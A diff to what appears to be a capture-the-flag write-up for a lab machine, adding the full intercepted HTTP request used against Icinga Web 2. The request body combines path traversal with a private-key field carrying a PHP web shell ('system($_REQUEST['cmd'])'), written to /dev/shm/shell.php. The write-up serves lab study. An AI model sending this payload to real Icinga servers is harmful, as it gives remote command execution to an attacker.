@@ -102,6 +102,26 @@ So we intercept the request in burp and manipulate the private key value
 After forwarding the request it works
 ![image](https://user-images.githubusercontent.com/127159644/227717395-c1fff159-ffbb-4c9c-88b9-fd84546ad1c3.png)
 
+Here's the request
 
+```
+POST /icingaweb2/config/createresource HTTP/1.1
+Host: icinga.cerberus.local:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Icinga-Accept: text/html
+X-Icinga-Container: col2
+X-Icinga-WindowId: uygbarnqzjmx_weauyb
+X-Requested-With: XMLHttpRequest
+Content-Length: 334
+Origin: http://icinga.cerberus.local:8080
+Connection: close
+Referer: http://icinga.cerberus.local:8080/icingaweb2/config/resource
+Cookie: Icingaweb2=s6tieh9hvacggibekoo9agmbio; icingaweb2-session=1679769643; icingaweb2-tzo=3600-0
 
+type=ssh&name=shell.php&user=..%2F..%2F..%2F..%2F..%2F..%2Fdev%2Fshm%2Fshell.php&private_key=file%3A%2F%2F%2Fetc%2Ficingaweb2%2Fssh%2Fhaxor00%3C%3Fphp+system(%24_REQUEST%5B'cmd'%5D)%3B%3F%3E&formUID=form_config_resource&CSRFToken=1379352477%7C91ede291a5bb76a464f88529cfe972d032c01b5fc8c9f06893f8ccc7de5e639b&btn_submit=Save+Changes
+```
 
